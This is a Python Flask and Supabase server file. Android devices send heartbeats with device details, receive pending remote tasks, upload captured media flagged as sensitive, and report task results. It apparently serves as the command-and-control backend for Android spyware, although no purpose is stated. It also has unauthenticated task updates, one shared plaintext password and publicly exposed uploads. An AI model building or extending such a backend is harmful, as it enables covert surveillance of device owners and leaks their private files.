import os
import time
import logging
from flask import Flask, request, jsonify
from supabase import create_client, Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

SUPABASE_URL = os.environ.get("SUPABASE_URL_A")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY_A")
MASTER_PASSWORD = os.environ.get("MASTER_PASSWORD")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400

        device_id = data.get('device_id')
        auth_token = data.get('auth_token')
        model = data.get('model')
        version = data.get('version')
        battery = data.get('battery')

        if auth_token != MASTER_PASSWORD:
            logger.warning(f"Unauthorized heartbeat from {device_id}")
            return jsonify({"error": "Unauthorized"}), 401

        supabase.table("client_info").upsert({
            "client_serial": device_id,
            "model_name": model,
            "android_version": version,
            "battery_level": battery,
            "auth_token": auth_token,
            "last_seen": "now()"
        }, on_conflict="client_serial").execute()

        tasks = supabase.table("service_tasks").select("*").eq("device_id", device_id).eq("status", "pending").execute()
        
        response = {
            "status": "ok",
            "tasks": tasks.data
        }
        return jsonify(response), 200

    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload_file():
    try:
        device_id = request.headers.get('X-Device-ID')
        auth_token = request.headers.get('X-Auth-Token')
        file_type = request.headers.get('X-File-Type', 'media')

        if auth_token != MASTER_PASSWORD:
            return jsonify({"error": "Unauthorized"}), 401

        file = request.files.get('file')
        if not file:
            return jsonify({"error": "No file"}), 400

        bucket = "media_captures"
        file_path = f"{device_id}/{file_type}_{int(time.time())}.dat"
        
        supabase.storage.from_(bucket).upload(file_path, file.read())
        public_url = supabase.storage.from_(bucket).get_public_url(file_path)

        supabase.table("media_captures").insert({
            "device_id": device_id,
            "file_url": public_url,
            "is_sensitive": file_type == "sensitive"
        }).execute()

        return jsonify({"status": "uploaded", "url": public_url}), 200

    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/task/update', methods=['POST'])
def update_task():
    try:
        data = request.get_json()
        task_id = data.get('task_id')
        status = data.get('status')
        result = data.get('result')

        supabase.table("service_tasks").update({
            "status": status,
            "result_data": result,
            "updated_at": "now()"
        }).eq("id", task_id).execute()

        return jsonify({"status": "updated"}), 200

    except Exception as e:
        logger.error(f"Task update error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
